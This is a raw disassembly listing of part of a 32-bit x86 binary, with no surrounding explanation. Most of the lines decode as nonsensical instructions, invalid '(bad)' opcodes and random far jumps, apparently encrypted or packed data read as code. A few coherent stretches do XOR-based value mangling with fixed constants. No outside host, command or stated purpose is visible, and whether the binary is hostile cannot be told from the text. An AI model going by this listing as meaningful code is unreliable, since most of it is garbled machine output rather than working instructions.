  40a423:	jne    0x40a43a
  40a425:	or     cl,BYTE PTR [esi]
  40a427:	mov    al,ds:0x900c67cf
  40a42c:	mov    al,0xb1
  40a42e:	adc    BYTE PTR [esi],bh
  40a430:	adc    dl,bl
  40a432:	mov    eax,ds:0xb43edba6
  40a437:	(bad)  
  40a438:	es add al,0x32
  40a43b:	es pushf 
  40a43d:	ins    DWORD PTR es:[edi],dx
  40a43e:	push   0x61
  40a440:	test   eax,0xfe58d25e
  40a445:	mov    eax,ds:0xb2fa466c
  40a44a:	mov    al,ds:0xc440cbae
  40a44f:	dec    esi
  40a450:	inc    ebp
  40a451:	icebp  
  40a452:	dec    ecx
  40a453:	out    dx,eax
  40a454:	or     eax,DWORD PTR [ebp-0x14]
  40a457:	icebp  
  40a458:	mov    gs:0x6de7ef8f,eax
  40a45e:	add    ebp,edi
  40a460:	sub    DWORD PTR [esi+0x4c],edi
  40a463:	jnp    0x40a431
  40a465:	cli    
  40a466:	pop    ecx
  40a467:	bsr    ebp,DWORD PTR [esi-0x7]
  40a46b:	mov    WORD PTR [ecx],?
  40a46d:	out    0x5,eax
  40a46f:	xchg   edi,eax
  40a470:	sti    
  40a471:	sahf   
  40a472:	mov    BYTE PTR [ebp-0x1a8fd8c0],bh
  40a478:	iret   
  40a479:	test   eax,0x3709d15e
  40a47e:	test   bl,0xd1
  40a481:	and    al,cl
  40a483:	lock gs iret 
  40a486:	fcmovnb st,st(2)
  40a488:	mov    bh,0xee
  40a48a:	jp     0x40a4e8
  40a48c:	repnz int3 
  40a48e:	outs   dx,DWORD PTR ds:[esi]
  40a48f:	fsubr  st(0),st
  40a491:	pop    esi
  40a492:	imul   edx,DWORD PTR [ecx+0x3a],0x27
  40a496:	loopne 0x40a471
  40a498:	retf   0x346d
  40a49b:	sbb    esi,eax
  40a49d:	xor    BYTE PTR [ecx-0xf],ch
  40a4a0:	(bad)  [ebp-0x79dec0b3]
  40a4a6:	mov    eax,ds:0x9aa8a32b
  40a4ab:	jno    0x40a4f9
  40a4ad:	fisttp DWORD PTR [ebx+0x71d56a49]
  40a4b3:	pushf  
  40a4b4:	inc    ebp
  40a4b5:	xchg   dh,bl
  40a4b7:	loope  0x40a444
  40a4b9:	or     eax,esi
  40a4bb:	ins    BYTE PTR es:[edi],dx
  40a4bc:	and    DWORD PTR [ebp+0x23],ebx
  40a4bf:	scas   al,BYTE PTR es:[edi]
  40a4c0:	dec    edi
  40a4c1:	push   edi
  40a4c2:	imul   ebp,DWORD PTR [ebp+0x11b6f500],0x2a5587ea
  40a4cc:	xchg   esi,eax
  40a4cd:	cdq    
  40a4ce:	mov    cl,0x8e
  40a4d0:	sbb    cl,BYTE PTR [eax]
  40a4d2:	adc    al,0x76
  40a4d4:	xchg   esp,eax
  40a4d5:	cmp    esi,DWORD PTR [esi-0x27d1371e]
  40a4db:	mov    bh,BYTE PTR [edx+0x7037a4f1]
  40a4e1:	pop    ss
  40a4e2:	mov    al,ds:0x75eab2b4
  40a4e7:	(bad)  
  40a4e8:	mov    edi,0x152d02e9
  40a4ed:	rcl    ebp,0x73
  40a4f0:	je     0x40a563
  40a4f2:	popa   
  40a4f3:	in     eax,0x1d
  40a4f5:	call   0x416c20
  40a4fa:	mov    eax,DWORD PTR [esi]
  40a4fc:	mov    ecx,DWORD PTR [esi+0x4]
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a4e7
  40a524:	pop    ecx
  40a525:	push   cs
  40a526:	jle    0x40a500
  40a528:	sub    ebx,DWORD PTR [eax]
  40a52a:	sbb    BYTE PTR [esi+0x16181812],bl
  40a530:	(bad)  
  40a532:	stc    
  40a533:	adc    al,0xda
  40a535:	test   BYTE PTR fs:[ebx+0x30],bl
  40a539:	add    bl,cl
  40a53b:	outs   dx,BYTE PTR ds:[esi]
  40a53c:	es adc al,0x37
  40a53f:	and    dh,BYTE PTR [ebp+0x53]
  40a542:	mov    ebp,0x67cace12
  40a547:	daa    
  40a548:	push   edi
  40a549:	xor    DWORD PTR [ebx-0x6e193eae],ebx
  40a54f:	xor    al,0xdf
  40a551:	xchg   esi,eax
  40a552:	mov    al,ds:0x134ec91c
  40a557:	mov    edx,0x2a7343f
  40a55c:	adc    al,0x49
  40a55e:	or     eax,0xff6a270a
  40a563:	lahf   
  40a564:	clc    
  40a565:	mov    dl,0x6d
  40a567:	out    0xba,al
  40a569:	push   eax
  40a56a:	push   esp
  40a56b:	shr    BYTE PTR [ebx],1
  40a56d:	fimul  WORD PTR [edx+0x6005db8b]
  40a573:	cmc    
  40a574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a575:	pop    edx
  40a576:	in     al,0x7d
  40a578:	popf   
  40a579:	fnstcw WORD PTR [ebp+0x52]
  40a57c:	jnp    0x40a5ac
  40a57e:	cli    
  40a57f:	lds    ebx,FWORD PTR [edi-0x64]
  40a582:	mov    esp,0xcce1ed93
  40a587:	adc    BYTE PTR [ebp+0x30],cl
  40a58a:	xchg   ah,al
  40a58c:	jp     0x40a599
  40a58e:	shr    BYTE PTR [edi+0x1048759a],cl
  40a594:	pop    ebx
  40a595:	ficom  DWORD PTR [edx]
  40a597:	xchg   edx,eax
  40a598:	add    ecx,esp
  40a59a:	ins    BYTE PTR es:[edi],dx
  40a59b:	dec    ebp
  40a59c:	and    al,0x5
  40a59e:	mov    ebx,0xf7f2b4fe
  40a5a3:	imul   eax,ebx,0xb69ce22a
  40a5a9:	xchg   ebx,eax
  40a5aa:	jnp    0x40a536
  40a5ac:	mov    bl,0x9b
  40a5ae:	nop
  40a5af:	enter  0xbf90,0xe9
  40a5b3:	cmp    al,0x40
  40a5b5:	add    al,0x29
  40a5b7:	out    dx,al
  40a5b8:	xchg   edi,eax
  40a5b9:	add    esi,ecx
  40a5bb:	ja     0x40a5ec
  40a5bd:	pop    ecx
  40a5be:	mov    dh,0x1a
  40a5c0:	xchg   DWORD PTR [ebp+0x1124ee92],edi
  40a5c6:	mov    bh,0x70
  40a5c8:	arpl   WORD PTR [esi-0x7aa86721],bp
  40a5ce:	(bad)  
  40a5cf:	popf   
  40a5d0:	xchg   BYTE PTR [ebp-0x16],bl
  40a5d3:	mov    dh,0xa6
  40a5d5:	dec    esi
  40a5d6:	mov    esi,0xc061b897
  40a5db:	ins    BYTE PTR es:[edi],dx
  40a5dc:	stc    
  40a5dd:	sbb    bh,BYTE PTR [ecx-0x8]
  40a5e0:	mov    ebx,0x9988abf3
  40a5e5:	into   
  40a5e6:	std    
  40a5e7:	xlat   BYTE PTR ds:[ebx]
  40a5e8:	mov    ebp,0xd4ad6211
  40a5ed:	into   
  40a5ee:	cmp    ch,BYTE PTR [ebp-0x20]
  40a5f1:	std    
  40a5f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5f3:	in     eax,0x72
  40a5f5:	fwait
  40a5f6:	jno    0x40a635
  40a5f8:	in     eax,dx
  40a5f9:	ins    BYTE PTR es:[edi],dx
  40a5fa:	inc    esi
  40a5fb:	imul   eax,DWORD PTR [esi-0x54],0x34
  40a5ff:	inc    edx
  40a600:	imul   esi,DWORD PTR [edi+ebx*4],0x25
  40a604:	es and esp,ebx
  40a607:	adc    DWORD PTR [eax-0x64],0x7bfe4ad
  40a60e:	pop    ecx
  40a60f:	rcl    DWORD PTR [ecx],1
  40a611:	in     eax,dx
  40a612:	bound  esi,QWORD PTR [edi]
  40a614:	or     ebx,ecx
  40a616:	fimul  WORD PTR gs:[edi-0x55]
  40a61a:	fwait
  40a61b:	mov    dl,0x44
  40a61d:	lahf   
  40a61e:	fs int 0x1b
  40a621:	sahf   
  40a622:	xchg   ebx,eax
  40a623:	loopne 0x40a5bb
  40a625:	cmp    cl,BYTE PTR [ecx]
  40a627:	frstor ds:0x1b7ad12b
  40a62d:	jmp    0x40a65d
  40a62f:	dec    eax
  40a630:	inc    ebp
  40a631:	out    dx,al
  40a632:	or     al,0x9a
  40a634:	mov    eax,0x6da2ddbf
  40a639:	jne    0x40a612
  40a63b:	stos   BYTE PTR es:[edi],al
  40a63c:	jno    0x40a5e3
  40a63e:	leave  
  40a63f:	or     dl,BYTE PTR ds:0x7c1e57cb
  40a645:	adc    BYTE PTR [ecx+0x72ec05d],cl
  40a64b:	repz leave 
  40a64d:	mov    al,ds:0x1dd08c31
  40a652:	sahf   
  40a653:	and    al,0xb7
  40a655:	imul   edx,esi,0xffffffb5
  40a658:	pop    ecx
  40a659:	push   edx
  40a65a:	mov    dl,0x51
  40a65c:	xor    al,0x3d
  40a65e:	ja     0x40a61b
  40a660:	jae    0x40a6cd
  40a662:	sub    bl,BYTE PTR [edx]
  40a664:	popf   
  40a665:	push   ds
  40a666:	xchg   ebx,eax
  40a667:	ret    0xa9e3
  40a66a:	fimul  DWORD PTR cs:[eax-0x2c]
  40a66e:	shl    BYTE PTR [ebx+esi*1],0xe6
  40a672:	lahf   
  40a673:	mov    BYTE PTR [edx+0x53],dh
  40a676:	enter  0xbda9,0x5c
  40a67a:	pop    esi
  40a67b:	hlt    
  40a67c:	pop    eax
  40a67d:	add    BYTE PTR [eax-0x54],ch
  40a680:	jecxz  0x40a6ad
  40a682:	mov    edx,0x19303688
  40a687:	outs   dx,DWORD PTR ds:[esi]
  40a688:	or     esp,eax
  40a68a:	xchg   ecx,eax
  40a68b:	ins    BYTE PTR es:[edi],dx
  40a68c:	and    dh,BYTE PTR ds:0x8d5fc426
  40a692:	and    BYTE PTR [edx],ch
  40a694:	and    BYTE PTR [ebp+0x72573bf1],dh
  40a69a:	ins    BYTE PTR es:[edi],dx
  40a69b:	mov    bh,BYTE PTR [esi-0x4288f010]
  40a6a1:	lea    esp,ds:0x99d34d35
  40a6a7:	mov    esp,0xb18d7656
  40a6ac:	sti    
  40a6ad:	nop
  40a6ae:	xchg   ecx,eax
  40a6af:	adc    al,BYTE PTR [esi-0x6a22c6ee]
  40a6b5:	mov    eax,cs:0x625e3123
  40a6bb:	ins    DWORD PTR es:[edi],dx
  40a6bc:	xchg   DWORD PTR [ecx-0x6cbf9beb],ecx
  40a6c2:	cmp    BYTE PTR [edi-0x21],dl
  40a6c5:	and    esi,DWORD PTR [ebx]
  40a6c7:	into   
  40a6c8:	popa   
  40a6c9:	out    0xf4,al
  40a6cb:	jno    0x40a676
  40a6cd:	pop    ebp
  40a6ce:	mov    al,ds:0xb57e9e8
  40a6d3:	add    al,0x71
  40a6d5:	dec    ebx
  40a6d6:	mov    DWORD PTR [esp+ebx*4],edi
  40a6d9:	and    eax,0x98c663e3
  40a6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6df:	xor    eax,0x893c9c2f
  40a6e4:	pop    ebp
  40a6e5:	cs dec ecx
  40a6e7:	xlat   BYTE PTR ds:[ebx]
  40a6e8:	pop    ds
  40a6e9:	push   ss
  40a6ea:	fs rcr ch,cl
  40a6ed:	rcr    DWORD PTR [ecx+ebx*8-0x5a],1
  40a6f1:	cld    
  40a6f2:	loopne 0x40a6bf
  40a6f4:	out    0x7e,eax
  40a6f6:	call   0x4660:0x1a328f2c
  40a6fd:	xchg   ebx,eax
  40a6fe:	cmp    eax,ecx
  40a700:	jbe    0x40a71d
  40a702:	jg     0x40a77f
  40a704:	dec    BYTE PTR [edi-0x1a]
  40a707:	mov    ds:0x912c930d,eax
  40a70c:	enter  0xfb56,0x8a
  40a710:	push   cs
  40a711:	fcmovb st,st(2)
  40a713:	cmp    al,0xef
  40a715:	popa   
  40a716:	in     al,dx
  40a717:	push   ebp
  40a718:	ss (bad) 
  40a71a:	fcmovnbe st,st(0)
  40a71c:	iret   
  40a71d:	gs pop eax
  40a71f:	xchg   edi,eax
  40a720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a721:	push   edx
  40a722:	stos   DWORD PTR es:[edi],eax
  40a723:	out    0xd9,eax
  40a725:	jmp    0x390b5ebf
  40a72a:	cmp    DWORD PTR [ebx+0x29eb5e27],ebx
  40a730:	nop
  40a731:	mov    ds:0x7b8a126f,eax
  40a736:	xor    dh,BYTE PTR ds:0xb2b44ca5
  40a73c:	and    DWORD PTR [ebx],ebp
  40a73e:	mov    al,ds:0xc8ff66e9
  40a743:	jge    0x40a700
  40a745:	int3   
  40a746:	in     al,dx
  40a747:	add    bh,BYTE PTR [esi-0x4a48e8ac]
  40a74d:	jbe    0x40a71a
  40a74f:	(bad)  
  40a750:	sbb    BYTE PTR [edi],dh
  40a752:	jle    0x40a737
  40a754:	ds jge 0x40a7d2
  40a757:	(bad)  
  40a758:	div    BYTE PTR [ebp+0x42]
  40a75b:	mov    edi,0xa6a997cc
  40a760:	push   ds
  40a761:	sub    edi,DWORD PTR [ecx]
  40a763:	into   
  40a764:	adc    al,0xe8
  40a766:	push   edi
  40a767:	inc    eax
  40a768:	dec    esp
  40a769:	jl     0x40a726
  40a76b:	ret    0x846d
  40a76e:	gs jmp 0x1ad3c38b
  40a774:	outs   dx,BYTE PTR ds:[esi]
  40a775:	cld    
  40a776:	scas   eax,DWORD PTR es:[edi]
  40a777:	cmp    DWORD PTR [ebx-0x479ccac3],edi
  40a77d:	jmp    0x38c32e54
  40a782:	cmp    BYTE PTR [edx-0x18cf0d82],0xf8
  40a789:	jno    0x40a717
  40a78b:	into   
  40a78c:	push   0x7d
  40a78e:	fwait
  40a78f:	pop    esi
  40a790:	es mov ebx,0x8de7820
  40a796:	xchg   ebx,eax
  40a797:	pop    es
  40a798:	dec    edx
  40a799:	lahf   
  40a79a:	int3   
  40a79b:	(bad)  
  40a79c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a79d:	imul   edi,edi,0xffffffe6
  40a7a0:	sub    eax,0xa263850f
  40a7a5:	inc    esi
  40a7a6:	jp     0x40a7a7
  40a7a8:	and    ebp,DWORD PTR [eax-0x40d23068]
  40a7ae:	test   BYTE PTR [eax+0x492d8e2d],bl
  40a7b4:	fstp   TBYTE PTR [edi+0x2dec9d48]
  40a7ba:	add    al,0x98
  40a7bc:	call   0xd75c:0x8adc725e
  40a7c3:	push   ebx
  40a7c4:	pop    ss
  40a7c5:	scas   al,BYTE PTR es:[edi]
  40a7c6:	int3   
  40a7c7:	sub    al,0xc2
  40a7c9:	jmp    0x40a847
  40a7cb:	xchg   bl,dh
  40a7cd:	jne    0x40a81b
  40a7cf:	push   esp
  40a7d0:	jle    0x40a7fc
  40a7d2:	cmp    DWORD PTR [ecx-0x60],eax
  40a7d5:	inc    ecx
  40a7d6:	aam    0x8d
  40a7d8:	(bad)  
  40a7d9:	cli    
  40a7da:	in     eax,dx
  40a7db:	(bad)  
  40a7dc:	mov    ah,0xad
  40a7de:	js     0x40a853
  40a7e0:	enter  0xe5e,0x15
  40a7e4:	xor    eax,0xbb6d5c29
  40a7e9:	dec    ecx
  40a7ea:	jecxz  0x40a861
  40a7ec:	dec    eax
  40a7ed:	lds    edx,FWORD PTR [edi+ecx*1+0x60]
  40a7f1:	pop    ds
  40a7f2:	sub    eax,0x23191a3c
  40a7f7:	cmp    ebx,ecx
  40a7f9:	sbb    DWORD PTR [ebx],ecx
  40a7fb:	cwde   
  40a7fc:	fistp  WORD PTR [ecx+0x258eca67]
  40a802:	fs mov bl,0x26
  40a805:	inc    esi
  40a806:	(bad)  
  40a808:	and    edi,ecx
  40a80a:	scas   al,BYTE PTR es:[edi]
  40a80b:	sbb    dl,ch
  40a80d:	jmp    0xe1865bd0
  40a812:	push   0xa8420418
  40a817:	mov    dh,0xbb
  40a819:	stos   BYTE PTR es:[edi],al
  40a81a:	add    al,0xe
  40a81c:	sub    al,BYTE PTR [ecx]
  40a81e:	push   esi
  40a81f:	dec    eax
  40a820:	(bad)  
  40a821:	pusha  
  40a822:	sbb    esp,DWORD PTR [esi+eax*1]
  40a825:	adc    eax,0xbc3fa281
  40a82a:	push   edx
  40a82b:	repz mov es,WORD PTR [edi]
  40a82e:	xlat   BYTE PTR ds:[ebx]
  40a82f:	icebp  
  40a830:	add    DWORD PTR [esi+0x72],esi
  40a833:	das    
  40a834:	outs   dx,BYTE PTR ds:[esi]
  40a835:	in     al,0x6e
  40a837:	inc    edx
  40a838:	push   ecx
  40a839:	cmc    
  40a83a:	pop    esp
  40a83b:	add    DWORD PTR ss:0x35d63611,eax
  40a842:	cmp    dl,dl
  40a844:	loopne 0x40a89c
  40a846:	add    al,0xd0
  40a848:	and    BYTE PTR [ebx-0x6b],0x4f
  40a84c:	das    
  40a84d:	jae    0x40a876
  40a84f:	jae    0x40a8b6
  40a851:	daa    
  40a852:	aad    0xa2
  40a854:	js     0x40a829
  40a856:	cmp    BYTE PTR [edx-0x156794b1],al
  40a85c:	mov    esi,0x933cf5ba
  40a861:	dec    esp
  40a862:	lahf   
  40a863:	xor    DWORD PTR [esi],eax
  40a865:	sub    edi,DWORD PTR [ebp-0x26ffc461]
  40a86b:	mov    edi,0xb9816180
  40a870:	pop    ecx
  40a871:	mov    DWORD PTR [ebx-0x4d96820d],ecx
  40a877:	pcmpgtd mm1,QWORD PTR [edx+0x50ceade8]
  40a87e:	cmp    al,0x16
  40a880:	inc    eax
  40a881:	lahf   
  40a882:	xor    al,bl
  40a884:	jle    0x40a87c
  40a886:	das    
  40a887:	ret    0x9c2a
  40a88a:	xchg   ecx,eax
  40a88b:	adc    BYTE PTR [edi+0x5e],ah
  40a88e:	pop    ebx
  40a88f:	js     0x40a828
  40a891:	(bad)  [edx]
  40a893:	fld    DWORD PTR [ebx+ebp*4+0x25]
  40a897:	dec    eax
  40a898:	jb     0x40a89a
  40a89a:	pushf  
  40a89b:	jmp    0x274:0xde29d734
  40a8a2:	jmp    0x40a8d5
  40a8a4:	pop    esp
  40a8a5:	rol    BYTE PTR [ebp-0x39],0xb2
  40a8a9:	xchg   edi,eax
  40a8aa:	push   0xffffff8d
  40a8ac:	and    BYTE PTR [edi+0x7f],cl
  40a8af:	je     0x40a865
  40a8b1:	xchg   esi,eax
  40a8b2:	clc    
  40a8b3:	jge    0x40a849
  40a8b5:	clc    
  40a8b6:	iret   
  40a8b7:	gs jmp 0x40a8a8
  40a8ba:	div    BYTE PTR [eax-0x5910a99d]
  40a8c0:	add    cl,ah
  40a8c2:	or     eax,0xacb0243b
  40a8c7:	dec    ecx
  40a8c8:	jp     0x40a8b2
  40a8ca:	dec    edi
  40a8cb:	aad    0x1a
  40a8cd:	nop
  40a8ce:	add    DWORD PTR fs:[esi+ebp*1-0x11],ecx
  40a8d3:	rol    DWORD PTR [esi],1
  40a8d5:	or     eax,0xe95c4a98
  40a8da:	mov    ch,0x15
  40a8dc:	cmovs  ecx,DWORD PTR [ebx+0x2af18531]
  40a8e3:	into   
  40a8e4:	clc    
  40a8e5:	loop   0x40a8aa
  40a8e7:	jmp    0x5094:0xe593d6e3
  40a8ee:	lock (bad) [ecx+0x138b1055]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x428303,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x4282f7,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428253,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x4282fb,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428283
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428277,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x4282f3
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42822b
  40aa46:	sbb    DWORD PTR ds:0x42816b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0x627e1f6a
  40aa65:	fidiv  WORD PTR [edi]
  40aa67:	push   0x5f
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	xchg   esi,eax
  40aa71:	inc    esi
  40aa72:	cwde   
  40aa73:	es fcmovne st,st(6)
  40aa76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa77:	push   0x87cc77aa
  40aa7c:	fnstcw WORD PTR [ebx+0x3]
  40aa7f:	(bad)  
  40aa80:	jle    0x40aa3c
  40aa82:	es ret 0x2be1
  40aa86:	test   eax,0xda026639
  40aa8b:	sub    DWORD PTR [eax-0x113cef45],ebp
  40aa91:	scas   al,BYTE PTR es:[edi]
  40aa92:	iret   
  40aa93:	jl     0x40aaa7
  40aa95:	pop    ds
  40aa96:	test   al,0x4
  40aa98:	mov    edi,0x8325f4b8
  40aa9d:	outs   dx,DWORD PTR ds:[esi]
  40aa9e:	data16 das 
  40aaa0:	pop    ebx
  40aaa1:	int    0x9
  40aaa3:	out    0x77,eax
  40aaa5:	sub    bl,cl
  40aaa7:	out    dx,eax
  40aaa8:	pop    ebp
  40aaa9:	aam    0xf5
  40aaab:	push   0x73
  40aaad:	js     0x40aaea
  40aaaf:	xchg   cl,dh
  40aab1:	push   ecx
  40aab2:	lds    edx,FWORD PTR fs:[ebp+esi*1+0x24]
  40aab7:	push   ebx
  40aab8:	xchg   esi,eax
  40aab9:	xchg   al,dl
  40aabb:	pop    edx
  40aabc:	and    DWORD PTR [edi+0x10b5627b],ebp
  40aac2:	in     eax,dx
  40aac3:	and    DWORD PTR [edi-0x72],edi
  40aac6:	xor    DWORD PTR [ecx],ebx
  40aac8:	mov    ch,0x43
  40aaca:	mov    ds:0x8564d07b,eax
  40aacf:	push   ebx
  40aad0:	cli    
  40aad1:	jo     0x40aab6
  40aad3:	lock sar ebx,1
  40aad6:	pop    ebx
  40aad7:	inc    eax
  40aad8:	adc    al,0xaf
  40aada:	dec    eax
  40aadb:	push   ecx
  40aadc:	lods   al,BYTE PTR ds:[esi]
  40aadd:	jbe    0x40aad3
  40aadf:	pop    edx
  40aae0:	leave  
  40aae1:	or     eax,ecx
  40aae3:	dec    ebx
  40aae4:	xor    WORD PTR [edi+0x18],di
  40aae8:	pop    esi
  40aae9:	cmp    esp,edx
  40aaeb:	xlat   BYTE PTR ds:[ebx]
  40aaec:	sti    
  40aaed:	push   es
  40aaee:	retf   0x9b21
  40aaf1:	jg     0x40aade
  40aaf3:	mov    dh,0x28
  40aaf5:	adc    al,BYTE PTR [eax-0x66]
  40aaf8:	(bad)  
  40aaf9:	xlat   BYTE PTR ds:[ebx]
  40aafa:	js     0x40aab2
  40aafc:	(bad)  
  40aafd:	outs   dx,BYTE PTR ds:[esi]
  40aafe:	test   BYTE PTR [edx+ebp*2],bl
  40ab01:	mov    ebx,0x2928c72d
  40ab06:	lahf   
  40ab07:	rcl    BYTE PTR [ebx],cl
  40ab09:	xchg   edi,eax
  40ab0a:	fcmovu st,st(3)
  40ab0c:	xchg   edx,eax
  40ab0e:	outs   dx,BYTE PTR ds:[esi]
  40ab0f:	sahf   
  40ab10:	mov    bl,BYTE PTR [eax+0x9]
  40ab13:	into   
  40ab14:	and    DWORD PTR [edi-0x58],ebp
  40ab17:	add    eax,0x103933dd
  40ab1c:	mov    esp,0xbdd8d9b8
  40ab21:	daa    
  40ab22:	push   ecx
  40ab23:	xchg   esp,eax
  40ab24:	aas    
  40ab25:	in     al,0xc
  40ab27:	mov    esp,DWORD PTR [ebx-0x552c876]
  40ab2d:	xchg   ecx,eax
  40ab2e:	into   
  40ab2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab30:	mov    WORD PTR [ecx-0x7],cs
  40ab33:	adc    eax,0xb263661f
  40ab38:	inc    ebp
  40ab39:	add    ecx,DWORD PTR [eax-0x79099410]
  40ab3f:	gs sub eax,0xc90d5307
  40ab45:	inc    esi
  40ab46:	daa    
  40ab47:	push   ds
  40ab48:	jmp    0x20dc:0x815cd141
  40ab4f:	call   0x4aa0:0x3e62ad7e
  40ab56:	shl    BYTE PTR [edx+0x40599d17],cl
  40ab5c:	mov    bl,0x4e
  40ab5e:	clc    
  40ab5f:	cs or  eax,0x4db7a1b8
  40ab65:	adc    DWORD PTR [edx+0x67],ebp
  40ab68:	cmp    eax,0x36218453
  40ab6d:	mov    esi,0x8b0ccce4
  40ab72:	fbstp  TBYTE PTR [ecx-0x60073f4d]
  40ab78:	lods   al,BYTE PTR ds:[esi]
  40ab79:	push   0x1f
  40ab7b:	xchg   BYTE PTR [ebp+ecx*2-0x3fe52984],bh
  40ab82:	call   0xc91d8808
  40ab87:	in     al,dx
  40ab88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab89:	ins    BYTE PTR es:[edi],dx
  40ab8a:	fidivr DWORD PTR [edx]
  40ab8c:	jb     0x40abd7
  40ab8e:	inc    edx
  40ab8f:	mov    ds:0xf41ef95e,al
  40ab94:	retf   
  40ab95:	pusha  
  40ab96:	push   esp
  40ab97:	and    eax,0xc7da1407
  40ab9c:	ror    DWORD PTR [ebp+0x48d8061d],0x9f
  40aba3:	out    0x92,eax
  40aba5:	lods   al,BYTE PTR ds:[esi]
  40aba6:	mov    WORD PTR [esi-0x54],es
  40aba9:	aam    0x3
  40abab:	add    al,0x13
  40abad:	fsub   QWORD PTR [ecx-0x652495da]
  40abb3:	cdq    
  40abb4:	(bad)  
  40abb5:	ficom  DWORD PTR [ebx+ebx*1]
  40abb8:	jnp    0x40ac34
  40abba:	retf   0x939d
  40abbd:	imul   esp,DWORD PTR [edi+0x3c8dff72],0xffffffc8
  40abc4:	push   eax
  40abc5:	(bad)  
  40abc6:	addr16 jnp 0x40ab96
  40abc9:	sbb    esi,DWORD PTR [ebp+edx*1+0x751c54b9]
  40abd0:	xor    DWORD PTR [eax-0x3c0e3b84],edx
  40abd6:	lods   eax,DWORD PTR ds:[esi]
  40abd7:	mov    esi,0x73793cbf
  40abdc:	or     eax,DWORD PTR [esi]
